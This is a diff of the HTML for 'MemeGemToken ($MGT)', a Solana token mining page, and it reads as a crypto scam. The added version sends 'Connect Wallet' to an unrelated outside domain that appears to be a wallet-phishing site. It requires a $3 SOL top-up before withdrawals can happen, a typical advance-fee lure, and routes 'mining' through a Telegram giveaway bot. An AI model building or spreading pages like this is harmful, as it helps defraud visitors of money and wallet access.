@@ -2,89 +2,78 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MemeGemToken Mining</title>
-  <script src="https://unpkg.com/@solana/wallet-adapter-wallets"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.41.1/lib/index.iife.min.js"></script>
+  <title>MemeGemToken | $MGT</title>
+  <link rel="icon" href="logo.png" type="image/png">
   <style>
     body {
-      margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      margin: 0;
+      background-color: #0d0d0d;
       color: #fff;
       text-align: center;
-      padding: 2rem;
     }
-    .container {
-      max-width: 600px;
-      margin: auto;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 15px;
-      padding: 2rem;
+    header {
+      padding: 40px 20px 10px;
     }
-    .btn {
-      background-color: #00c9a7;
+    header img {
+      width: 100px;
+    }
+    h1 {
+      font-size: 2.4em;
+      margin-top: 10px;
+    }
+    .wallet-connect, .topup, .mining {
+      background: #121212;
+      margin: 30px auto;
+      padding: 20px;
+      max-width: 480px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+    }
+    .wallet-connect button,
+    .topup button,
+    .mining button {
+      margin-top: 15px;
+      padding: 12px 24px;
+      font-size: 16px;
+      background: #00ff99;
+      color: #000;
       border: none;
-      color: white;
-      padding: 1rem 2rem;
-      font-size: 1rem;
-      margin-top: 1rem;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
     }
-    .btn:disabled {
-      background-color: #aaa;
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #aaa;
     }
-    .wallet-status {
-      margin-top: 1rem;
-      font-weight: bold;
-    }
+    a { color: #00ff99; text-decoration: none; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>MemeGemToken ($MGT) Mining</h1>
-    <p>Connect your Solana wallet to start mining and earning MGT tokens!</p><button id="connectButton" class="btn">Connect Wallet</button>
-<div id="walletAddress" class="wallet-status"></div>
-
-<div id="miningSection" style="display:none;">
-  <p><strong>Top-up Required:</strong> $3 (approx. 0.02 SOL)</p>
-  <button class="btn" onclick="topUp()">Top Up Balance</button>
-  <p id="miningStatus"></p>
-  <button class="btn" onclick="startMining()">Start Mining</button>
-  <button class="btn" onclick="requestWithdrawal()">Request Withdrawal</button>
-</div>
-
-  </div>  <script>
-    let walletPublicKey = null;
-
-    document.getElementById('connectButton').addEventListener('click', async () => {
-      if ('solana' in window) {
-        const provider = window.solana;
-        try {
-          const resp = await provider.connect();
-          walletPublicKey = resp.publicKey.toString();
-          document.getElementById('walletAddress').innerText = 'Wallet: ' + walletPublicKey;
-          document.getElementById('miningSection').style.display = 'block';
-        } catch (err) {
-          console.error(err);
-        }
-      } else {
-        alert('Solana wallet not found. Use Phantom or Backpack.');
-      }
-    });
-
-    function topUp() {
-      alert('Redirecting to SOL payment page for $3 top-up (mock)...');
-      // Simulate top-up logic
-      document.getElementById('miningStatus').innerText = 'Top-up successful! You can now mine and withdraw.';
-    }
-
-    function startMining() {
-      alert('Mining started! Earn MGT tokens by staying active.');
-    }
-
-    function requestWithdrawal() {
-      alert('Withdrawal request sent. Tokens will be sent to your wallet after verification.');
-    }
-  </script></body>
+  <header>
+    <img src="logo.png" alt="MemeGemToken Logo">
+    <h1>Welcome to MemeGemToken ($MGT)</h1>
+    <p>Earn by Mining. Claim Airdrops. Withdraw straight to wallet.</p>
+  </header>  <div class="wallet-connect">
+    <h2>Connect Wallet</h2>
+    <p>Synchronize your Solana wallet to start mining and earning rewards.</p>
+    <button onclick="window.location.href='https://connect-chain-auth.web.app'">Connect Wallet</button>
+  </div>  <div class="topup">
+    <h2>Top Up</h2>
+    <p>You must top up at least $3 worth of SOL to unlock withdrawals.</p>
+    <button onclick="alert('Top-up portal coming soon')">Top Up Now</button>
+  </div>  <div class="mining">
+    <h2>Start Mining</h2>
+    <p>Begin earning $MGT by interacting with our Telegram bot and mining interface.</p>
+    <button onclick="window.location.href='https://t.me/MemeGeyserGiveaway_bot'">Mine Now</button>
+  </div>  <footer>
+    <p>Follow us: 
+      <a href="https://x.com/MemeGemToken_EN">Twitter</a> | 
+      <a href="https://t.me/memegemtoken_officialchannel">Telegram</a> | 
+      <a href="https://discord.gg/5mkuPvDC">Discord</a>
+    </p>
+    <p>&copy; 2025 MemeGemToken | Built on Solana</p>
+  </footer>
+</body>
 </html>
